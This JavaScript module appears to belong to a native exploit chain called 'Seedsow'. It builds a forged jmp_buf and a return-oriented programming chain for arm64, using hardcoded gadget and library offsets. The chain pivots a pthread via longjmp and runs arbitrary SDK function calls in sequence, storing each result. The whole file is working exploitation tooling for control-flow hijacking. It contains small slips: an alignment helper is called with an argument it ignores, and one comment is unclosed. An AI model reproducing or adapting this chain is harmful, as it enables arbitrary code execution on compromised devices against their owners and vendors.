// Seedsow native worker frame: a pthread that pivots off longjmp onto a ROP
// chain, calls a list of SDK functions in order, and stores each x0 result.
//
// Layout (all offsets relative to the owned region base):
//   +0x0000  forged jmp_buf: x19 = first job, PC = vcall8_restore, SP = +0x8000
//   +0x8000  call regions, 0x90 bytes each: V (0x50), B (0x20), S (0x20)
//   ...      result cells (contiguous
//   ...      job records (0x60 each: x1 at +0x38, target at +0x48, x0 at +0x50)
//
// The call chain never uses g_load_x19: longjmp restores x19 from the jmp_buf,
// and every g_store epilogue loads x19/x30 from the S frame, so the next call's
// V frame begins exactly at S+0x20.
//
// Per call:
//   V: x0..x7 args, x29=0, x30=g_call2
//   B: x29=0, x30=g_store, x20=SENTINEL, x19=result cell
//   S: x29=0, x30=vcall8 (or pthread_exit), x20=0, x19=next job (or 0)
//   J: x1, target, x0
// g_call2 overrides x0/x1 from J and calls [J+0x48] with x2..x7 from V.
const PAGE = 4096;
const SENTINEL = 0xfedcba9876543210n;
const MEMCPY = 0x5224e0;
const PTHREAD_CREATE = 0x142180;
const PTHREAD_JOIN = 0x142480;
const PTHREAD_EXIT = 0x142410;
const LONGJMP = 0x5511b4;
const VCALL8_RESTORE = 0x3d9e54;
const G_CALL2 = 0xc27d8;
const G_STORE_X0_X19 = 0x173db4;

const JMPBUF = 0x0000;
const STACK = 0x8000;
const V = 0x00, B = 0x50, S = 0x70;
const REGION = 0x90;
const JOB = 0x60;

const align = value => Math.ceil(value / PAGE) * PAGE;

function put(frame, offset, value) {
  const word = BigInt(value);
  if (word < 0n || word > 0xffffffffffffffffn) throw Error('Worker word is outside uint64');
  frame.writeBigUInt64LE(word, offset);
}

function build(base, limit, calls, sdk, main) {
  if (base % PAGE || sdk % PAGE || main % PAGE) throw Error('Invalid worker address or modules');
  if (!Array.isArray(calls) || calls.length < 1 || calls.length > 32768)
    throw Error('Invalid worker call list');

  // First pass: expand each call into an optional u32 memcpy job and the call job.
  const jobs = [], logicalResultIndices = [];
  for (const call of calls) {
    if (!call || !Number.isInteger(call.function)) throw Error('Invalid worker call');
    const args = call.args || [];
    if (args.length > 4) throw Error('Workers support at most four arguments');
    const dynamic = [];
    args.forEach((argument, index) => {
      if (typeof argument !== 'object') return;
      if (!argument) throw Error('Invalid dynamic argument');
      if ('u32' in argument) {
        if (!Number.isSafeInteger(argument.u32) || argument.u32 <= 0 || argument.u32 % 4)
          throw Error('Dynamic arguments require an aligned u32 address');
        dynamic.push({index, u32: argument.u32});
      } else if ('result' in argument) {
        if (!Number.isInteger(argument.result) || argument.result < 0)
          throw Error('Dynamic result arguments need a call index');
        dynamic.push({index, result: argument.result});
      } else throw Error('Dynamic arguments require u32 or result');
    });
    const callJobIndex = jobs.length + dynamic.length;
    for (const entry of dynamic) {
      jobs.push({target: sdk + MEMCPY, args: [0, entry.u32 || 0, 4, 0],
        dynamic: {callJobIndex, index: entry.index, result: entry.result}});
    }
    jobs.push({target: call.function,
      args: [0, 1, 2, 3].map(index => typeof args[index] === 'object' ? 0 : (args[index] || 0))});
    logicalResultIndices.push(jobs.length - 1);
  }

  const count = jobs.length;
  const chainStart = STACK;
  const chainEnd = chainStart + count * REGION;
  const results = align(chainEnd, 0x100);
  const jobsBase = align(results + (count + 2) * 8, 0x10);
  const size = align(jobsBase + count * JOB);
  if (size > limit) throw Error('Worker frame exceeds reserved space');

  // Resolve dynamic memcpy destinations into the target call's argument slots.
  for (const job of jobs) {
    if (!job.dynamic) continue;
    const {callJobIndex, index, result} = job.dynamic;
    const at = chainStart + callJobIndex * REGION;
    const jt = jobsBase + callJobIndex * JOB;
    job.args[0] = base + (index < 2 ? jt + (index === 0 ? 0x50 : 0x38)
      : at + V + (index === 2 ? 0x10 : 0x18));
    if (result !== undefined) {
      const resultJob = logicalResultIndices[result];
      if (resultJob === undefined) throw Error('Dynamic result call index is out of range');
      job.args[1] = base + results + resultJob * 8;
    }
  }

  const frame = Buffer.alloc(size);
  // Forged jmp_buf: longjmp restores x19..x28, x29/x30 from +0x50, sp from +0x68.
  put(frame, JMPBUF + 0x00, base + jobsBase); // x19 = first job
  put(frame, JMPBUF + 0x50, 0);              // x29
  put(frame, JMPBUF + 0x58, sdk + VCALL8_RESTORE); // x30 / PC
  put(frame, JMPBUF + 0x68, base + chainStart);    // sp

  for (let i = 0; i < count; i++) {
    const job = jobs[i];
    const at = chainStart + i * REGION;
    const jt = jobsBase + i * JOB;
    const result = results + i * 8;
    // V frame.
    put(frame, at + V + 0x00, job.args[0]);
    put(frame, at + V + 0x08, job.args[1]);
    put(frame, at + V + 0x10, job.args[2]);
    put(frame, at + V + 0x18, job.args[3]);
    put(frame, at + V + 0x40, 0);                 // x29
    put(frame, at + V + 0x48, main + G_CALL2);    // x30
    // B frame (g_call2 epilogue).
    put(frame, at + B + 0x00, 0);                 // x29
    put(frame, at + B + 0x08, main + G_STORE_X0_X19); // x30
    put(frame, at + B + 0x10, SENTINEL);          // x20; writes SENTINEL two cells ahead
    put(frame, at + B + 0x18, base + result);     // x19 = result cell
    // S frame (g_store epilogue).
    put(frame, at + S + 0x00, 0);                 // x29
    put(frame, at + S + 0x08, i + 1 < count ? sdk + VCALL8_RESTORE : sdk + PTHREAD_EXIT);
    put(frame, at + S + 0x10, 0);                 // x20
    put(frame, at + S + 0x18, i + 1 < count ? base + jobsBase + (i + 1) * JOB : 0); // x19
    // Job record read by g_call2.
    put(frame, jt + 0x38, job.args[1]);
    put(frame, jt + 0x48, job.target);
    put(frame, jt + 0x50, job.args[0]);
    // Results are pre-filled so a worker that never reaches a call is visible.
    put(frame, result, SENTINEL);
  }
  put(frame, results + count * 8, SENTINEL);
  put(frame, results + (count + 1) * 8, SENTINEL);

  const resultOffsets = jobs.map((_, index) => results + index * 8);
  const cancelJob = logicalResultIndices[Math.min(1, logicalResultIndices.length - 1)];
  const cancelCell = base + jobsBase + cancelJob * JOB + 0x48;
  return {frame, proof: {
    bytes: size, logicalCalls: calls.length, nativeCalls: count,
    resultOffsets, logicalResultIndices, resultOffset: resultOffsets[count - 1],
    stackOffset: STACK, tablesOffset: 0, cancelCell,
  }};
}

module.exports = {build, SENTINEL, PTHREAD_CREATE, PTHREAD_JOIN, PTHREAD_EXIT, LONGJMP};
